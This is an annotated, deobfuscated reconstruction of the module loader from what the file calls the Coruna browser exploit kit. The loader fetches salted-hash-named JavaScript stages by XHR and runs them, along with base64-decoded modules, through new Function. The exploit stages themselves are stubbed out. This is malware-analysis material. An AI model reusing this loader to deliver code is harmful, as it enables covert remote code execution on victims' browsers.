/**
 * Module Loader System
 * =====================
 * Implements the obChTK module system used to load exploit stages.
 *
 * The module system uses SHA1 hashes as module identifiers. Modules are
 * either inline (defined in group.html) or loaded remotely via XHR.
 *
 * Functions:
 *   - loadModuleSync (hPL3On): Load a module by SHA1 hash from cache
 *   - loadModuleAsync (ZKvD0e): Load a module from server, cache, and return
 *   - evalBase64Module (fgPoij): Decode base64 JS and register as module
 *   - setBaseUrl (po3QmN): Set the base URL for remote module loading
 *   - setSalt (eW4__H): Set the SHA256 salt for filename generation
 *
 * Module Registry (moduleMap / MM):
 *   Key: SHA1 hash string (40 chars)
 *   Value: Factory function that returns module exports
 *
 * Part of the Coruna exploit kit (group.html).
 */

window.globalThis = window;

globalThis.obChTK = (function () {
    /**
     * Module registry: SHA1 hash → factory function
     * Inline modules are defined here; remote modules are added dynamically.
     */
    let moduleMap = {
        // Module: utility_module.js (type conversions, Int64, TypeHelper)
        "57620206d62079baad0e57e6d9ec93120c0f5247": () => {
            // ... (see utility_module.js)
        },

        // Module: platform_module.js (version detection, offsets, lockdown check)
        "14669ca3b1519ba2a8f40be287f646d4d7593eb0": () => {
            // ... (see platform_module.js)
        },
    };

    /**
     * Module cache: stores instantiated module exports
     * Special keys: "$" = base URL, "p" = SHA256 salt
     */
    const moduleCache = {
        "$": "",  // Base URL for remote loading
        "p": ""   // Salt for SHA256 filename hashing
    };

    /**
     * SHA-256 implementation for generating module filenames
     * (See sha256.js for the full implementation)
     */
    // function sha256(message) { ... }

    /**
     * Load a module synchronously from cache or inline registry.
     * @param {string} moduleId - SHA1 hash identifying the module
     * @returns {object} Module exports
     */
    function loadModuleSync(moduleId) {
        if (moduleId in moduleCache == false) {
            if (moduleId in moduleMap != true) {
                throw new Error("");
            }
            // Execute factory function and cache result
            moduleCache[moduleId] = moduleMap[moduleId]();
        }
        return moduleCache[moduleId];
    }

    return {
        /**
         * Set the base URL for remote module loading
         * @param {string} url - Base URL prefix
         */
        setBaseUrl: function (url) {
            moduleCache["$"] = url;
        },

        /**
         * Set the SHA256 salt for filename generation
         * @param {string} salt - Salt string prepended to module ID before hashing
         */
        setSalt: function (salt) {
            moduleCache["p"] = salt;
        },

        /**
         * Load module synchronously (from cache or inline registry)
         * Original name: hPL3On
         * @param {string} moduleId - SHA1 hash of the module
         * @returns {object} Module exports
         */
        loadModuleSync: loadModuleSync,
        // Keep original name for compatibility:
        hPL3On: loadModuleSync,

        /**
         * Load module asynchronously from remote server.
         * Original name: ZKvD0e
         *
         * Filename is computed as: SHA256(salt + moduleId).substring(0, 40) + ".js"
         * The file is fetched via XHR from baseUrl + filename.
         *
         * @param {string} moduleId - SHA1 hash of the module
         * @returns {Promise<object>} Module exports
         */
        loadModuleAsync: async function (moduleId) {
            console.log(`[LOADER] Loading module: ${moduleId.substring(0, 12)}...`);
            if (moduleId in moduleCache == false && moduleId in moduleMap == false) {
                // Compute filename from SHA256 hash
                let filename = moduleId;
                filename = sha256(moduleCache["p"] + moduleId).substring(0, 40);

                // Fetch the module source from server
                const source = await (async function fetchModule(name) {
                    return new Promise((resolve, reject) => {
                        const xhr = new XMLHttpRequest;
                        let url;

                        // Add random cache-busting query parameter
                        const randomLen = (min, max) => Math.floor(Math.random() * (max - min + 1)) + min;
                        url = new URL(moduleCache["$"] + name);
                        const paramName = Math.random().toString(36).slice(2, randomLen(5, 10));
                        const paramValue = randomLen(0, 1);
                        url.searchParams.set(paramName, paramValue);

                        xhr.open("GET", url.toString(), true);
                        xhr.responseType = "text";
                        xhr.onreadystatechange = () => {
                            if (xhr.readyState === XMLHttpRequest.DONE) {
                                if (200 === xhr.status) {
                                    const response = xhr.response;
                                    if (null === response || "" === response) {
                                        reject("");
                                    } else {
                                        resolve(response);
                                    }
                                } else {
                                    reject("");
                                }
                            }
                        };
                        xhr.send();
                    });
                })(filename + ".js");

                // Execute the fetched source as a module factory
                moduleCache[moduleId] = new Function(source)();
            }
            return loadModuleSync(moduleId);
        },
        // Keep original name:
        ZKvD0e: async function(M) { /* same as loadModuleAsync */ },

        /**
         * Register a base64-encoded module.
         * Original name: fgPoij
         *
         * Decodes base64 string to JavaScript source, wraps in Function(),
         * executes it, and stores the result in the module cache.
         *
         * @param {string} moduleId - SHA1 hash for the module
         * @param {string} base64Source - Base64-encoded JavaScript source
         */
        evalBase64Module: function (moduleId, base64Source) {
            if (moduleId in moduleCache == false) {
                moduleCache[moduleId] = new Function(atob(base64Source))();
            }
        },
        // Keep original name:
        fgPoij: function(M, I) {
            if (M in moduleCache == false) {
                moduleCache[M] = new Function(atob(I))();
            }
        }
    };
})();

// Set the base URL for remote module loading
// (decoded from fqMaGkNg: "./7a7d99099b035b2c6512b6ebeeea6df1ede70fbb.min.js")
// The actual base path is extracted up to the last "/"
const utilityModule = globalThis.obChTK.hPL3On(
    "57620206d62079baad0e57e6d9ec93120c0f5247"
);
const platformModule = globalThis.obChTK.hPL3On(
    "14669ca3b1519ba2a8f40be287f646d4d7593eb0"
);

// Compute base URL from the script's own path
let baseUrl = utilityModule.resolveUrl(
    "./7a7d99099b035b2c6512b6ebeeea6df1ede70fbb.min.js"
);
baseUrl = baseUrl.slice(0, baseUrl.lastIndexOf("/") + 1);
globalThis.obChTK.setBaseUrl(baseUrl);
// Original name: globalThis.obChTK.po3QmN(baseUrl)

// Set SHA256 salt for remote module filename generation
globalThis.obChTK.setSalt("cecd08aa6ff548c2");
// Original name: globalThis.obChTK.eW4__H("cecd08aa6ff548c2")
